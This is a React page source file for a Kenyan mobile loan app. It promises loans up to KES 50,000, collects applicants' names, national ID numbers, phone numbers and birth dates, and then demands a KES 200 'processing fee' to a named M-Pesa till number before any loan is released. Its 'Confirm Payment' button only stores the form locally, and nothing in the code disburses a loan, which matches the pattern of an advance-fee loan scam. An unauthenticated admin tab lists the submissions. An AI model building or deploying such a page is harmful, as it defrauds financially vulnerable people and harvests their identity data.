"use client";
import { useState } from "react";

export default function Home() {
  const [showForm, setShowForm] = useState(false);
  const [step, setStep] = useState(1);
  const [activeTab, setActiveTab] = useState("home");

  const [form, setForm] = useState({
    firstName: "",
    middleName: "",
    lastName: "",
    id: "",
    phone: "",
    dob: "",
    maritalStatus: "",
    employmentStatus: "",
    amount: "",
    months: "",
    purpose: "",
  });

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const loanAmount = Number(form.amount) || 0;
  const months = Number(form.months) || 0;
  const interest = loanAmount * 0.15;
  const total = loanAmount + interest;

  return (
    <div style={styles.wrapper}>

      {/* MAIN CONTENT */}
      <div style={styles.container}>

        {/* HOME */}
        {activeTab === "home" && !showForm && (
          <>
            <img src="/logo.png" style={styles.logo} />

            <div style={styles.card}>
              <h2>Get up to KES 50,000</h2>
              <p>Quick loans with 15% fixed interest.</p>

              <button style={styles.applyBtn} onClick={() => setShowForm(true)}>
                Apply Now →
              </button>
            </div>
          </>
        )}

        {/* FORM */}
        {activeTab === "home" && showForm && (
          <>
            <h2>Loan Application</h2>

            {/* STEP 1 */}
            {step === 1 && (
              <>
                <input name="firstName" placeholder="First Name *" onChange={handleChange} style={styles.input} />
                <input name="middleName" placeholder="Middle Name" onChange={handleChange} style={styles.input} />
                <input name="lastName" placeholder="Last Name *" onChange={handleChange} style={styles.input} />
                <input name="id" placeholder="ID Number *" onChange={handleChange} style={styles.input} />
                <input name="phone" placeholder="Phone Number *" onChange={handleChange} style={styles.input} />
                <input type="date" name="dob" onChange={handleChange} style={styles.input} />

                <select name="maritalStatus" onChange={handleChange} style={styles.input}>
                  <option value="">Marital Status *</option>
                  <option>Single</option>
                  <option>Married</option>
                  <option>Divorced</option>
                  <option>Widowed</option>
                </select>

                <select name="employmentStatus" onChange={handleChange} style={styles.input}>
                  <option value="">Employment Status *</option>
                  <option>Employed</option>
                  <option>Self Employed</option>
                  <option>Business</option>
                  <option>Student</option>
                  <option>Other</option>
                </select>

                <button style={styles.button} onClick={() => {
                  if (!form.firstName || !form.lastName || !form.phone) {
                    alert("Fill all required fields");
                    return;
                  }
                  setStep(2);
                }}>Next</button>
              </>
            )}

            {/* STEP 2 */}
            {step === 2 && (
              <>
                <input name="amount" type="number" placeholder="KES 1,000 - 50,000" onChange={handleChange} style={styles.input} />
                <input name="months" type="number" placeholder="1 - 12 months" onChange={handleChange} style={styles.input} />

                <select name="purpose" onChange={handleChange} style={styles.input}>
                  <option value="">Loan Purpose *</option>
                  <option>Business</option>
                  <option>Personal</option>
                  <option>Medical</option>
                  <option>Emergency</option>
                  <option>Other</option>
                </select>

                <button style={styles.button} onClick={() => setStep(1)}>Back</button>

                <button style={styles.button} onClick={() => {
                  if (loanAmount < 1000 || loanAmount > 50000) {
                    alert("Invalid loan amount");
                    return;
                  }
                  if (months < 1 || months > 12) {
                    alert("Invalid months");
                    return;
                  }
                  setStep(3);
                }}>Next</button>
              </>
            )}

            {/* STEP 3 */}
            {step === 3 && (
              <>
                <p>Amount: KES {loanAmount}</p>
                <p>Interest: KES {interest}</p>
                <p>Total: KES {total}</p>

                <button style={styles.button} onClick={() => setStep(2)}>Back</button>
                <button style={styles.button} onClick={() => setStep(4)}>Proceed</button>
              </>
            )}

            {/* STEP 4 */}
            {step === 4 && (
              <>
                <p>Pay KES 200 via M-Pesa</p>
                <p><strong>Till Number: 8808802</strong></p>

                <p style={{ color: "red", fontWeight: "bold" }}>
                  NOTE: You will receive your loan if you have paid the processing fee.
                </p>

                <button style={styles.button} onClick={() => {
                  const apps = JSON.parse(localStorage.getItem("applications") || "[]");
                  apps.push(form);
                  localStorage.setItem("applications", JSON.stringify(apps));

                  alert("Application submitted!");
                  setShowForm(false);
                  setStep(1);
                }}>
                  Confirm Payment
                </button>
              </>
            )}
          </>
        )}

        {/* ADMIN */}
        {activeTab === "admin" && (
          <>
            <h2>Admin Dashboard</h2>

            {JSON.parse(localStorage.getItem("applications") || "[]").map((app, i) => (
              <div key={i} style={styles.card}>
                <p>{app.firstName} {app.lastName}</p>
                <p>KES {app.amount}</p>
              </div>
            ))}
          </>
        )}

      </div>

      {/* BOTTOM NAV */}
      <div style={styles.nav}>
        <div onClick={() => setActiveTab("home")} style={styles.navItem}>🏠<br/>Home</div>
        <div onClick={() => setActiveTab("admin")} style={styles.navItem}>⚙️<br/>Admin</div>
      </div>

    </div>
  );
}

const styles = {
  wrapper: { paddingBottom: "70px" },
  container: { maxWidth: "400px", margin: "auto", padding: "20px" },
  logo: { width: "120px" },
  card: { background: "#1f7a4c", color: "white", padding: "15px", borderRadius: "15px", marginTop: "10px" },
  applyBtn: { padding: "10px", background: "white", border: "none", marginTop: "10px" },
  input: { width: "100%", padding: "10px", margin: "10px 0" },
  button: { padding: "10px", margin: "5px", background: "green", color: "white", border: "none" },
  nav: { position: "fixed", bottom: 0, width: "100%", display: "flex", justifyContent: "space-around", background: "#fff", padding: "10px" },
  navItem: { textAlign: "center", cursor: "pointer" }
};
